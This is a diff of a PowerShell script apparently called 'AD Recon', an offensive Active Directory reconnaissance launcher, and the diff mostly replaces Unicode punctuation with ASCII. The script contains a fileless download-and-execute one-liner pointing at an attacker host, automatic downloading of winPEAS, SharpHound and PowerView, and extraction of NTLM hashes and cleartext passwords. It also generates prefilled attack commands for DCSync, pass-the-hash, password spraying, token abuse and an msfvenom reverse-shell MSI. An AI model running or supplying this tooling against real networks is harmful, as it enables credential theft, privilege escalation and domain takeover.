@@ -1,7 +1,7 @@
 #Requires -Version 3
 <#
 .SYNOPSIS
-    AD Recon — pure PowerShell launcher. No Python required.
+    AD Recon - pure PowerShell launcher. No Python required.
     Run this when you only have a CMD or PowerShell session on the target.
 
 .USAGE
@@ -11,7 +11,7 @@
     # From CMD:
     powershell -NoProfile -ExecutionPolicy Bypass -File launch.ps1
 
-    # From memory (no file on disk) — paste this one-liner into any PS prompt:
+    # From memory (no file on disk) - paste this one-liner into any PS prompt:
     IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>:8080/launch.ps1')
 #>
 
@@ -28,9 +28,9 @@ function Write-Warn  ($m) { Write-Host "  [!] $m" -ForegroundColor Yellow }
 function Write-Dim   ($m) { Write-Host "      $m" -ForegroundColor DarkGray }
 function Write-Section ($t) {
     Write-Host ""
-    Write-Host ("─" * 60) -ForegroundColor Magenta
+    Write-Host ("-" * 60) -ForegroundColor Magenta
     Write-Host "  $t"     -ForegroundColor Magenta
-    Write-Host ("─" * 60) -ForegroundColor Magenta
+    Write-Host ("-" * 60) -ForegroundColor Magenta
     Write-Host ""
 }
 
@@ -49,9 +49,9 @@ Write-Host @"
 "@ -ForegroundColor Red
 
 # ---------------------------------------------------------------------------
-# Phase 0 — Auto-Discovery
+# Phase 0 - Auto-Discovery
 # ---------------------------------------------------------------------------
-Write-Section "PHASE 0 — Environment Auto-Discovery"
+Write-Section "PHASE 0 - Environment Auto-Discovery"
 Write-Info "Scanning your environment..."
 
 $disc = @{
@@ -102,9 +102,9 @@ try {
 # Print summary
 Write-Host "  Current User"
 Write-Good "Logged in as:          $($disc.Username)"
-if ($disc.IsSystem)     { Write-Host "  [+] Privilege level:         " -NoNewline; Write-Host "NT AUTHORITY\SYSTEM — already at top" -ForegroundColor Red }
+if ($disc.IsSystem)     { Write-Host "  [+] Privilege level:         " -NoNewline; Write-Host "NT AUTHORITY\SYSTEM - already at top" -ForegroundColor Red }
 elseif ($disc.IsAdmin)  { Write-Host "  [+] Privilege level:         " -NoNewline; Write-Host "Local Administrator" -ForegroundColor Yellow }
-else                    { Write-Good "Privilege level:       Standard user — privesc paths will be enumerated" }
+else                    { Write-Good "Privilege level:       Standard user - privesc paths will be enumerated" }
 
 Write-Host ""
 Write-Host "  Machine"
@@ -122,20 +122,20 @@ if ($disc.DcHostname)  { Write-Good "DC Hostname:           $($disc.DcHostname)"
 
 Write-Host ""
 Write-Host "  Connectivity"
-if ($disc.Internet) { Write-Good "Internet:              reachable — tools will be downloaded if missing" }
-else                { Write-Warn "Internet:              not reachable — offline mode" }
+if ($disc.Internet) { Write-Good "Internet:              reachable - tools will be downloaded if missing" }
+else                { Write-Warn "Internet:              not reachable - offline mode" }
 
 # ---------------------------------------------------------------------------
-# Phase 1 — Wizard
+# Phase 1 - Wizard
 # ---------------------------------------------------------------------------
 Write-Host ""
 Read-Host "  Press Enter to continue to the setup wizard"
-Write-Section "PHASE 1 — Setup Wizard"
+Write-Section "PHASE 1 - Setup Wizard"
 
 # Auth
 Write-Host "  Authentication" -ForegroundColor White
 if ($disc.IsSystem) {
-    Write-Good "Running as SYSTEM — using machine account context for AD enumeration."
+    Write-Good "Running as SYSTEM - using machine account context for AD enumeration."
     $auth = @{ Type = "system"; Username = ""; Password = ""; Hash = "" }
 } else {
     Write-Host @"
@@ -143,7 +143,7 @@ if ($disc.IsSystem) {
   [1] Already running as a domain user (no extra creds)   <- default
   [2] I have a domain username + password
   [3] I have an NTLM hash (Pass-the-Hash)
-  [4] No credentials — null session only
+  [4] No credentials - null session only
 "@
     $choice = Read-Host "  > Choice [1-4]"
     if (-not $choice) { $choice = "1" }
@@ -166,7 +166,7 @@ if ($disc.IsSystem) {
     }
 }
 
-# Target — confirm or fill gaps
+# Target - confirm or fill gaps
 Write-Host ""
 Write-Host "  Target" -ForegroundColor White
 
@@ -223,11 +223,11 @@ foreach ($kv in $scope.GetEnumerator()) {
 # ---------------------------------------------------------------------------
 function Get-Tool ($Name, $Url, $Dest) {
     if (Test-Path $Dest) { Write-Good "$Name already exists."; return $true }
-    if (-not $disc.Internet) { Write-Warn "$Name not found and no internet — skipping."; return $false }
+    if (-not $disc.Internet) { Write-Warn "$Name not found and no internet - skipping."; return $false }
     Write-Info "Downloading $Name..."
     try {
         (New-Object System.Net.WebClient).DownloadFile($Url, $Dest)
-        Write-Good "Downloaded $Name → $Dest"
+        Write-Good "Downloaded $Name ? $Dest"
         return $true
     } catch {
         Write-Bad "Failed to download $Name`: $_"
@@ -236,9 +236,9 @@ function Get-Tool ($Name, $Url, $Dest) {
 }
 
 # ---------------------------------------------------------------------------
-# Phase 2 — Enumeration
+# Phase 2 - Enumeration
 # ---------------------------------------------------------------------------
-Write-Section "PHASE 2 — Enumeration"
+Write-Section "PHASE 2 - Enumeration"
 
 $results = @{}
 
@@ -252,7 +252,7 @@ if ($scope.RunWinPEAS) {
         $outFile = Join-Path $rawDir "winpeas.txt"
         $out | Out-File $outFile -Encoding UTF8
         $results["winpeas"] = $out
-        Write-Good "winPEAS done → $outFile"
+        Write-Good "winPEAS done ? $outFile"
     }
 }
 
@@ -267,7 +267,7 @@ if ($scope.RunSharpHound) {
         $out = & $dest @shArgs 2>&1 | Out-String
         $out | Out-File (Join-Path $rawDir "sharphound.txt") -Encoding UTF8
         $results["sharphound"] = $out
-        Write-Good "SharpHound done — ZIP saved to $rawDir"
+        Write-Good "SharpHound done - ZIP saved to $rawDir"
     }
 }
 
@@ -304,7 +304,7 @@ if ($scope.RunPowerView) {
         $outFile = Join-Path $rawDir "powerview.txt"
         $pvOut | Out-File $outFile -Encoding UTF8
         $results["powerview"] = $pvOut
-        Write-Good "PowerView done → $outFile"
+        Write-Good "PowerView done ? $outFile"
     }
 }
 
@@ -322,7 +322,7 @@ if ($scope.RunPowerUp) {
         $outFile = Join-Path $rawDir "powerup.txt"
         $puOut | Out-File $outFile -Encoding UTF8
         $results["powerup"] = $puOut
-        Write-Good "PowerUp done → $outFile"
+        Write-Good "PowerUp done ? $outFile"
     }
 }
 
@@ -334,19 +334,19 @@ if ($scope.RunSeatbelt) {
         $out = & $dest "-group=all" 2>&1 | Out-String
         $out | Out-File (Join-Path $rawDir "seatbelt.txt") -Encoding UTF8
         $results["seatbelt"] = $out
-        Write-Good "Seatbelt done → $(Join-Path $rawDir 'seatbelt.txt')"
+        Write-Good "Seatbelt done ? $(Join-Path $rawDir 'seatbelt.txt')"
     } else {
-        Write-Warn "Seatbelt.exe not found in tools/ — skipping. (Compile it manually from GhostPack/Seatbelt)"
+        Write-Warn "Seatbelt.exe not found in tools/ - skipping. (Compile it manually from GhostPack/Seatbelt)"
     }
 }
 
 # ---------------------------------------------------------------------------
-# Phase 3 — Parse & Report
+# Phase 3 - Parse & Report
 # ---------------------------------------------------------------------------
-Write-Section "PHASE 3 — Report Generation"
+Write-Section "PHASE 3 - Report Generation"
 Write-Info "Building intelligence tables and reports..."
 
-# ── Loot extraction ──────────────────────────────────────────────────────────
+# -- Loot extraction ----------------------------------------------------------
 function Get-Section ($text, $header) {
     if (-not $text) { return "" }
     $pattern = "===\s*$([regex]::Escape($header))\s*===\s*`n([\s\S]*?)(?====|\z)"
@@ -394,7 +394,7 @@ if ($pv) {
     foreach ($row in (Get-TableRows (Get-Section $pv "KERBEROASTABLE USERS"))) {
         $parts = $row.Trim() -split "\s+"
         if ($parts[0]) { $loot.Kerberoastable += $parts[0] }
-        if ($parts.Count -gt 1) { $loot.Spns += "$($parts[0]) → $($parts[1])" }
+        if ($parts.Count -gt 1) { $loot.Spns += "$($parts[0]) ? $($parts[1])" }
     }
     foreach ($row in (Get-TableRows (Get-Section $pv "ASREP ROASTABLE USERS"))) {
         $name = ($row.Trim() -split "\s+")[0]
@@ -424,7 +424,7 @@ if ($wp) {
     $loot.InterestingFiles = ([regex]::Matches($wp, "(?i)C:\\[^\s\n]*\.(txt|xml|ini|config|cfg|bat|ps1|kdbx)") | Select-Object -ExpandProperty Value -Unique)[0..19]
 }
 
-# ── Findings detection ────────────────────────────────────────────────────────
+# -- Findings detection --------------------------------------------------------
 $findings = [System.Collections.Generic.List[hashtable]]::new()
 
 function Add-Finding ($Id, $Title, $Severity, $Category, $Description, $Evidence, $Tool) {
@@ -441,24 +441,24 @@ function Add-Finding ($Id, $Title, $Severity, $Category, $Description, $Evidence
 
 if ($pv) {
     if ($loot.Kerberoastable.Count -gt 0) {
-        Add-Finding "kerberoastable_users" "Kerberoastable Service Accounts ($($loot.Kerberoastable.Count) found)" "HIGH" "Kerberos" "Accounts with SPNs — any domain user can request their TGS and crack offline." $loot.Kerberoastable "PowerView"
+        Add-Finding "kerberoastable_users" "Kerberoastable Service Accounts ($($loot.Kerberoastable.Count) found)" "HIGH" "Kerberos" "Accounts with SPNs - any domain user can request their TGS and crack offline." $loot.Kerberoastable "PowerView"
     }
     if ($loot.AsrepRoastable.Count -gt 0) {
-        Add-Finding "asrep_roastable" "AS-REP Roastable Accounts ($($loot.AsrepRoastable.Count) found)" "HIGH" "Kerberos" "Pre-auth disabled — AS-REP hash requestable without any credentials." $loot.AsrepRoastable "PowerView"
+        Add-Finding "asrep_roastable" "AS-REP Roastable Accounts ($($loot.AsrepRoastable.Count) found)" "HIGH" "Kerberos" "Pre-auth disabled - AS-REP hash requestable without any credentials." $loot.AsrepRoastable "PowerView"
     }
     $uncRows = Get-TableRows (Get-Section $pv "UNCONSTRAINED DELEGATION") | Where-Object { $_ -notmatch "DC|DOMAIN.CONTROLLER" }
     if ($uncRows.Count -gt 0) {
-        Add-Finding "unconstrained_delegation" "Unconstrained Delegation (Non-DC)" "CRITICAL" "Delegation" "Non-DC machine(s) with unconstrained delegation. Coerce DC auth → capture TGT → DCSync." $uncRows "PowerView"
+        Add-Finding "unconstrained_delegation" "Unconstrained Delegation (Non-DC)" "CRITICAL" "Delegation" "Non-DC machine(s) with unconstrained delegation. Coerce DC auth ? capture TGT ? DCSync." $uncRows "PowerView"
     }
     $aclRows = Get-TableRows (Get-Section $pv "ACL MISCONFIGS")
     $critAcl = $aclRows | Where-Object { $_ -match "GenericAll|WriteDACL|WriteOwner" }
     $highAcl = $aclRows | Where-Object { $_ -match "GenericWrite|ForceChangePassword" }
-    if ($critAcl.Count -gt 0) { Add-Finding "acl_critical" "Critical ACL Misconfigurations" "CRITICAL" "ACL" "GenericAll/WriteDACL/WriteOwner found — leads to DCSync or DA group membership." $critAcl "PowerView" }
-    if ($highAcl.Count -gt 0) { Add-Finding "acl_high" "High-Risk ACL Misconfigurations" "HIGH" "ACL" "GenericWrite/ForceChangePassword — targeted Kerberoasting or password reset without auth." $highAcl "PowerView" }
+    if ($critAcl.Count -gt 0) { Add-Finding "acl_critical" "Critical ACL Misconfigurations" "CRITICAL" "ACL" "GenericAll/WriteDACL/WriteOwner found - leads to DCSync or DA group membership." $critAcl "PowerView" }
+    if ($highAcl.Count -gt 0) { Add-Finding "acl_high" "High-Risk ACL Misconfigurations" "HIGH" "ACL" "GenericWrite/ForceChangePassword - targeted Kerberoasting or password reset without auth." $highAcl "PowerView" }
 
     $polLines = Get-Section $pv "PASSWORD POLICY"
     if ($polLines -match "LockoutBadCount\s*=\s*0") {
-        Add-Finding "no_lockout" "No Account Lockout Policy" "HIGH" "PasswordPolicy" "LockoutBadCount = 0 — spray passwords freely with no risk of locking accounts." @("LockoutBadCount = 0") "PowerView"
+        Add-Finding "no_lockout" "No Account Lockout Policy" "HIGH" "PasswordPolicy" "LockoutBadCount = 0 - spray passwords freely with no risk of locking accounts." @("LockoutBadCount = 0") "PowerView"
     }
     if ($loot.DomainTrusts.Count -gt 0) {
         Add-Finding "domain_trusts" "Domain Trusts Identified" "MEDIUM" "Enumeration" "Bidirectional or SID-history trusts can allow cross-domain privilege escalation." $loot.DomainTrusts "PowerView"
@@ -470,13 +470,13 @@ if ($wp) {
         Add-Finding "always_install_elevated" "AlwaysInstallElevated Enabled" "CRITICAL" "LocalPrivesc" "Any user can install MSI packages as SYSTEM." @("AlwaysInstallElevated = 1") "winPEAS"
     }
     if ($loot.HashesFound.Count -gt 0) {
-        Add-Finding "hashes_found" "NTLM Hashes Extracted" "CRITICAL" "CredentialAccess" "NTLM hashes found — crack offline or use for Pass-the-Hash." $loot.HashesFound "winPEAS"
+        Add-Finding "hashes_found" "NTLM Hashes Extracted" "CRITICAL" "CredentialAccess" "NTLM hashes found - crack offline or use for Pass-the-Hash." $loot.HashesFound "winPEAS"
     }
     if ($loot.PasswordsFound.Count -gt 0) {
         Add-Finding "passwords_found" "Cleartext Passwords Found" "CRITICAL" "CredentialAccess" "Possible cleartext passwords found in files or registry." $loot.PasswordsFound "winPEAS"
     }
     $unquoted = [regex]::Matches($wp, "(?i)Unquoted Service Path[^\n]*\n([^\n]+)") | ForEach-Object { $_.Groups[1].Value.Trim() }
-    if ($unquoted.Count -gt 0) { Add-Finding "unquoted_service_paths" "Unquoted Service Paths ($($unquoted.Count) found)" "HIGH" "LocalPrivesc" "Plant a binary in the unquoted path — runs as SYSTEM on service restart." $unquoted "winPEAS" }
+    if ($unquoted.Count -gt 0) { Add-Finding "unquoted_service_paths" "Unquoted Service Paths ($($unquoted.Count) found)" "HIGH" "LocalPrivesc" "Plant a binary in the unquoted path - runs as SYSTEM on service restart." $unquoted "winPEAS" }
     $autologon = [regex]::Matches($wp, "(?i)(AutoAdminLogon|DefaultUserName|DefaultPassword)[^\n]*") | ForEach-Object { $_.Value }
     if ($autologon.Count -gt 0) { Add-Finding "autologon_creds" "AutoLogon Credentials in Registry" "CRITICAL" "CredentialAccess" "Plaintext credentials stored for automatic logon." $autologon "winPEAS" }
 }
@@ -486,7 +486,7 @@ if ($pu) {
     $modFiles = [regex]::Matches($pu, "(?i)ModifiableFile\s*:\s*([^\n]+)") | ForEach-Object { $_.Groups[1].Value.Trim() }
     if ($modFiles.Count -gt 0) { Add-Finding "modifiable_service_files" "Modifiable Service Binaries" "HIGH" "LocalPrivesc" "Current user can overwrite service binary that runs as SYSTEM." $modFiles "PowerUp" }
     $tokenPrivs = [regex]::Matches($pu, "SeImpersonatePrivilege|SeAssignPrimaryTokenPrivilege|SeTcbPrivilege|SeDebugPrivilege") | ForEach-Object { $_.Value } | Sort-Object -Unique
-    if ($tokenPrivs.Count -gt 0) { Add-Finding "token_privileges" "Dangerous Token Privileges" "HIGH" "LocalPrivesc" "SeImpersonate/SeDebug found — Potato attacks or SYSTEM process injection." $tokenPrivs "PowerUp" }
+    if ($tokenPrivs.Count -gt 0) { Add-Finding "token_privileges" "Dangerous Token Privileges" "HIGH" "LocalPrivesc" "SeImpersonate/SeDebug found - Potato attacks or SYSTEM process injection." $tokenPrivs "PowerUp" }
 }
 
 # Sort by severity
@@ -495,7 +495,7 @@ $sorted = $findings | Sort-Object { $sevOrder[$_.Severity] }
 
 Write-Good "Detected $($sorted.Count) finding(s)."
 
-# ── HTML helpers ──────────────────────────────────────────────────────────────
+# -- HTML helpers --------------------------------------------------------------
 function Esc ($s) { [System.Web.HttpUtility]::HtmlEncode($s) }
 $web = [System.Reflection.Assembly]::LoadWithPartialName("System.Web") | Out-Null
 # Fallback HTML escape without System.Web
@@ -515,7 +515,7 @@ function Render-LootCard ($title, $items, $headerClass, $daSet) {
         $rows = ""
         foreach ($item in ($items | Select-Object -First 30)) {
             $cell = HtmlEsc $item
-            if ($daSet -and $daSet -contains $item) { $cell = "<span style='color:#ff4444;font-weight:700;'>$cell ★</span>" }
+            if ($daSet -and $daSet -contains $item) { $cell = "<span style='color:#ff4444;font-weight:700;'>$cell ?</span>" }
             $rows += "<tr><td>$cell</td></tr>"
         }
         $body = "<table class='loot-table'><tbody>$rows</tbody></table>"
@@ -555,38 +555,38 @@ $attackTemplates = @{
         )
     }
     "unconstrained_delegation" = @{
-        Title = "Unconstrained Delegation → DCSync"; Phase = "Privilege Escalation → Domain Takeover"
+        Title = "Unconstrained Delegation ? DCSync"; Phase = "Privilege Escalation ? Domain Takeover"
         Steps = @(
             @{ Desc = "Monitor for incoming TGTs";           Cmd = "Rubeus.exe monitor /interval:5 /nowrap" }
             @{ Desc = "Coerce DC auth (PrinterBug)";         Cmd = "SpoolSample.exe $dcIpVal $($disc.LocalIP)"; Note = "Or: impacket-PetitPotam $($disc.LocalIP) $dcIpVal" }
             @{ Desc = "Inject captured TGT";                 Cmd = "Rubeus.exe ptt /ticket:<BASE64_TICKET>" }
-            @{ Desc = "DCSync — dump all hashes";            Cmd = "mimikatz.exe `"lsadump::dcsync /domain:$domainVal /all /csv`" exit" }
+            @{ Desc = "DCSync - dump all hashes";            Cmd = "mimikatz.exe `"lsadump::dcsync /domain:$domainVal /all /csv`" exit" }
         )
     }
     "acl_critical" = @{
-        Title = "Critical ACL Abuse → DCSync"; Phase = "Privilege Escalation"
+        Title = "Critical ACL Abuse ? DCSync"; Phase = "Privilege Escalation"
         Steps = @(
             @{ Desc = "Grant yourself DCSync rights via WriteDACL"; Cmd = "Add-DomainObjectAcl -TargetIdentity $domainVal -PrincipalIdentity $($disc.Username) -Rights DCSync -Verbose" }
-            @{ Desc = "DCSync — dump all hashes";                   Cmd = "impacket-secretsdump $domainVal/$($disc.Username)@$dcIpVal -just-dc-ntlm" }
-            @{ Desc = "GenericAll on user → reset password";        Cmd = "Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword (ConvertTo-SecureString '<NEWPASS>' -AsPlainText -Force)" }
+            @{ Desc = "DCSync - dump all hashes";                   Cmd = "impacket-secretsdump $domainVal/$($disc.Username)@$dcIpVal -just-dc-ntlm" }
+            @{ Desc = "GenericAll on user ? reset password";        Cmd = "Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword (ConvertTo-SecureString '<NEWPASS>' -AsPlainText -Force)" }
         )
     }
     "no_lockout" = @{
         Title = "Password Spraying"; Phase = "Credential Access"
         Steps = @(
-            @{ Desc = "Spray from Windows";  Cmd = "Invoke-DomainPasswordSpray -Password <PASSWORD> -Domain $domainVal -OutFile $outDir\spray_results.txt"; Note = "No lockout — safe to spray" }
+            @{ Desc = "Spray from Windows";  Cmd = "Invoke-DomainPasswordSpray -Password <PASSWORD> -Domain $domainVal -OutFile $outDir\spray_results.txt"; Note = "No lockout - safe to spray" }
             @{ Desc = "Spray from Linux";    Cmd = "crackmapexec smb $dcIpVal -u <USERS_FILE> -p <PASSWORD> --continue-on-success" }
         )
     }
     "always_install_elevated" = @{
-        Title = "AlwaysInstallElevated → SYSTEM Shell"; Phase = "Local Privilege Escalation"
+        Title = "AlwaysInstallElevated ? SYSTEM Shell"; Phase = "Local Privilege Escalation"
         Steps = @(
             @{ Desc = "Generate MSI payload"; Cmd = "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f msi -o $outDir\evil.msi" }
             @{ Desc = "Install as SYSTEM";    Cmd = "msiexec /quiet /qn /i $outDir\evil.msi" }
         )
     }
     "token_privileges" = @{
-        Title = "Token Privilege Abuse → SYSTEM"; Phase = "Local Privilege Escalation"
+        Title = "Token Privilege Abuse ? SYSTEM"; Phase = "Local Privilege Escalation"
         Steps = @(
             @{ Desc = "GodPotato (modern Windows)"; Cmd = "GodPotato.exe -cmd `"cmd /c <PAYLOAD>`"" }
             @{ Desc = "PrintSpoofer alternative";   Cmd = "PrintSpoofer64.exe -i -c cmd.exe" }
@@ -594,7 +594,7 @@ $attackTemplates = @{
         )
     }
     "hashes_found" = @{
-        Title = "Pass-the-Hash / Hash Cracking"; Phase = "Credential Access → Lateral Movement"
+        Title = "Pass-the-Hash / Hash Cracking"; Phase = "Credential Access ? Lateral Movement"
         Steps = @(
             @{ Desc = "Crack NTLM hashes";           Cmd = "hashcat -m 1000 $outDir\hashes.txt <WORDLIST> --force"; Note = "Mode 1000 = NTLM" }
             @{ Desc = "Pass-the-Hash (Windows)";     Cmd = "mimikatz.exe `"sekurlsa::pth /user:<USER> /domain:$domainVal /ntlm:<HASH> /run:cmd.exe`"" }
@@ -611,22 +611,22 @@ function Render-AttackCard ($f) {
     $blocks  = ""
     foreach ($step in $tmpl.Steps) {
         $cmd  = HtmlEsc $step.Cmd
-        # Known real values → orange
+        # Known real values ? orange
         $cmd  = $cmd -replace [regex]::Escape((HtmlEsc $domainVal)), "<span class='val'>$(HtmlEsc $domainVal)</span>"
         if ($dcIpVal)         { $cmd = $cmd -replace [regex]::Escape((HtmlEsc $dcIpVal)),         "<span class='val'>$(HtmlEsc $dcIpVal)</span>" }
         if ($disc.LocalIP)    { $cmd = $cmd -replace [regex]::Escape((HtmlEsc $disc.LocalIP)),    "<span class='val'>$(HtmlEsc $disc.LocalIP)</span>" }
         if ($disc.Username)   { $cmd = $cmd -replace [regex]::Escape((HtmlEsc $disc.Username)),   "<span class='val'>$(HtmlEsc $disc.Username)</span>" }
         if ($outDir)          { $cmd = $cmd -replace [regex]::Escape((HtmlEsc $outDir)),           "<span class='val'>$(HtmlEsc $outDir)</span>" }
-        # Placeholders → red
+        # Placeholders ? red
         $cmd  = $cmd -replace "&lt;([A-Z_]+)&gt;", "<span class='placeholder'>&lt;`$1&gt;</span>"
-        $note = if ($step.Note) { "<div class='cmd-note'>⚠ $(HtmlEsc $step.Note)</div>" } else { "" }
+        $note = if ($step.Note) { "<div class='cmd-note'>? $(HtmlEsc $step.Note)</div>" } else { "" }
         $blocks += "<div class='cmd-block'><div class='cmd-desc'>$(HtmlEsc $step.Desc)</div><pre>$cmd</pre>$note</div>"
     }
     $inner = "<h3>$(HtmlEsc $tmpl.Title)$phaseTag</h3>$blocks"
     return "<div class='finding'><div class='finding-header'><span class='finding-title'>$title</span></div><div class='finding-body open'>$inner</div></div>"
 }
 
-# ── Build loot grid ────────────────────────────────────────────────────────────
+# -- Build loot grid ------------------------------------------------------------
 $daSet = $loot.DomainAdmins
 $lootGrid = @(
     (Render-LootCard "Domain Users"           $loot.DomainUsers       "lh-blue"   $daSet)
@@ -647,12 +647,12 @@ $lootGrid = @(
 $lootSection = @"
 <div class='loot-section'>
   <h2>Intelligence Summary</h2>
-  <p style='color:var(--dim);margin-bottom:8px;'>Everything collected at a glance. Domain Admin members marked ★</p>
+  <p style='color:var(--dim);margin-bottom:8px;'>Everything collected at a glance. Domain Admin members marked ?</p>
   <div class='loot-grid'>$lootGrid</div>
 </div>
 "@
 
-# ── Summary bar ────────────────────────────────────────────────────────────────
+# -- Summary bar ----------------------------------------------------------------
 $sevCounts = @{ CRITICAL=0; HIGH=0; MEDIUM=0; LOW=0; INFO=0 }
 foreach ($f in $sorted) { $sevCounts[$f.Severity]++ }
 $summaryBar = ($sevCounts.GetEnumerator() | Where-Object { $_.Value -gt 0 } | ForEach-Object {
@@ -660,18 +660,18 @@ $summaryBar = ($sevCounts.GetEnumerator() | Where-Object { $_.Value -gt 0 } | Fo
 }) -join ""
 $summaryBar = "<div class='summary'>$summaryBar</div>"
 
-# ── Finding cards ──────────────────────────────────────────────────────────────
+# -- Finding cards --------------------------------------------------------------
 $findingCards = ($sorted | ForEach-Object { Render-FindingCard $_ }) -join ""
 
-# ── Attack cards ───────────────────────────────────────────────────────────────
+# -- Attack cards ---------------------------------------------------------------
 $attackCards = ($sorted | ForEach-Object { Render-AttackCard $_ }) -join ""
 
 # BloodHound guide
 $zipFile = Get-ChildItem $rawDir -Filter "*bloodhound*.zip" -ErrorAction SilentlyContinue | Select-Object -First 1
-$zipLine = if ($zipFile) { "<li>SharpHound ZIP: <code>$($zipFile.FullName)</code></li>" } else { "<li>SharpHound ZIP not found — run SharpHound manually.</li>" }
+$zipLine = if ($zipFile) { "<li>SharpHound ZIP: <code>$($zipFile.FullName)</code></li>" } else { "<li>SharpHound ZIP not found - run SharpHound manually.</li>" }
 $bhGuide = @"
 <div class='guide-box'>
-  <h3>BloodHound — How to Load Your Data</h3>
+  <h3>BloodHound - How to Load Your Data</h3>
   <ol>
     $zipLine
     <li>Open BloodHound, connect to Neo4j database.</li>
@@ -688,7 +688,7 @@ $bhGuide = @"
 </div>
 "@
 
-# ── Shared CSS ─────────────────────────────────────────────────────────────────
+# -- Shared CSS -----------------------------------------------------------------
 $css = @"
 <style>
 :root{--bg:#0d1117;--surface:#161b22;--border:#30363d;--text:#e6edf3;--dim:#8b949e;--critical:#ff4444;--high:#ff8800;--medium:#e3b341;--low:#58a6ff;--info:#8b949e;--orange:#ff9f43;--green:#3fb950;--code-bg:#1c2128;}
@@ -759,11 +759,11 @@ $metaLine = "Generated: $ts &nbsp;|&nbsp; Domain: <strong>$(HtmlEsc $domainVal)<
 
 $legend = "<div style='margin-bottom:24px;padding:12px 16px;background:var(--surface);border-radius:8px;border:1px solid var(--border);'><strong>Legend:</strong>&nbsp;<span style='color:var(--orange);font-weight:700;'>Orange</span> = pre-filled from your environment &nbsp;|&nbsp; <span style='color:#ff6b6b;'>&lt;PLACEHOLDER&gt;</span> = you fill this in</div>"
 
-# ── Write Report 1 ─────────────────────────────────────────────────────────────
+# -- Write Report 1 -------------------------------------------------------------
 $r1 = @"
-<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><title>AD Recon — Report 1: Findings</title>$css</head>
+<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><title>AD Recon - Report 1: Findings</title>$css</head>
 <body><div class='container'>
-<header><h1>🔍 Report 1 — Findings &amp; Enumeration</h1><div class='meta'>$metaLine</div></header>
+<header><h1>? Report 1 - Findings &amp; Enumeration</h1><div class='meta'>$metaLine</div></header>
 <h2>Summary</h2>$summaryBar
 $lootSection
 <h2>Findings</h2>
@@ -773,13 +773,13 @@ $findingCards
 "@
 $r1Path = Join-Path $outDir "report1_findings.html"
 $r1 | Out-File $r1Path -Encoding UTF8
-Write-Good "Report 1 → $r1Path"
+Write-Good "Report 1 ? $r1Path"
 
-# ── Write Report 2 ─────────────────────────────────────────────────────────────
+# -- Write Report 2 -------------------------------------------------------------
 $r2 = @"
-<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><title>AD Recon — Report 2: Attack Commands</title>$css</head>
+<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><title>AD Recon - Report 2: Attack Commands</title>$css</head>
 <body><div class='container'>
-<header><h1>⚔️  Report 2 — Attack Commands</h1><div class='meta'>$metaLine</div></header>
+<header><h1>??  Report 2 - Attack Commands</h1><div class='meta'>$metaLine</div></header>
 <h2>BloodHound Data</h2>$bhGuide
 <h2>Attack Commands</h2>$legend
 $attackCards
@@ -787,9 +787,9 @@ $attackCards
 "@
 $r2Path = Join-Path $outDir "report2_attack_commands.html"
 $r2 | Out-File $r2Path -Encoding UTF8
-Write-Good "Report 2 → $r2Path"
+Write-Good "Report 2 ? $r2Path"
 
-# ── Done ───────────────────────────────────────────────────────────────────────
+# -- Done -----------------------------------------------------------------------
 Write-Section "Done"
 Write-Good "Report 1 (Findings):        $r1Path"
 Write-Good "Report 2 (Attack Commands): $r2Path"
